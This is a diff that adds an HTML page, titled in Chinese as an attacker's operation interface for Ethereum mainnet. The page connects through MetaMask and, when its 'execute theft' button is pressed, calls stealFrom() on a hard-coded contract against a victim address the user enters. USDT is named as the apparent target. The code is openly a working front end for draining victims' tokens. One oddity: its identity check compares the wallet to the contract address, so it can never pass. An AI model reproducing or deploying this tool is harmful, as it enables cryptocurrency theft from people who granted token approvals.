@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>🛠 攻擊者操作介面 v3.0.1（Ethereum 主網）</title>
+</head>
+<body>
+  <h2>🛠 攻擊者操作介面 v3.0.1（Ethereum 主網）</h2>
+  <p>合約地址：<b>0xDa4FfA490992769B8F54063bf0B9E7a4D3479459</b></p>
+  <p>目前登入帳號：<span id="account">MetaMask 連線中...</span></p>
+  <p>✅ 身份驗證：<span id="identity">驗證中...</span></p>
+  <input id="victim" value="0x..." size="50">
+  <button onclick="steal()">執行盜取</button>
+
+  <pre id="log" style="margin-top: 1em; color: #333;"></pre>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+  <script>
+    const contractAddress = '0xDa4FfA490992769B8F54063bf0B9E7a4D3479459';
+    const usdt = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+
+    const abi = [
+      'function stealFrom(address victim) public',
+      'function allowance(address owner, address spender) view returns (uint256)',
+      'function balanceOf(address owner) view returns (uint256)'
+    ];
+
+    const contractAbi = ['function stealFrom(address)'];
+
+    async function steal() {
+      const log = document.getElementById('log');
+      log.textContent = '';
+
+      try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const user = await signer.getAddress();
+        document.getElementById('account').textContent = user;
+
+        const identity = user.toLowerCase() === contractAddress.toLowerCase()
+          ? '✅ 你是攻擊者本人'
+          : '❌ 非攻擊者帳號，請切換';
+        document.getElementById('identity').textContent = identity;
+
+        const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+        const victim = document.getElementById('victim').value;
+
+        log.textContent += `🚀 呼叫 stealFrom(${victim})...
+`;
+        const tx = await contract.stealFrom(victim);
+        log.textContent += `✅ TX Hash: ${tx.hash}
+`;
+      } catch (err) {
+        log.textContent += `❌ 失敗: ${err.message}
+`;
+      }
+    }
+  </script>
+</body>
+</html>
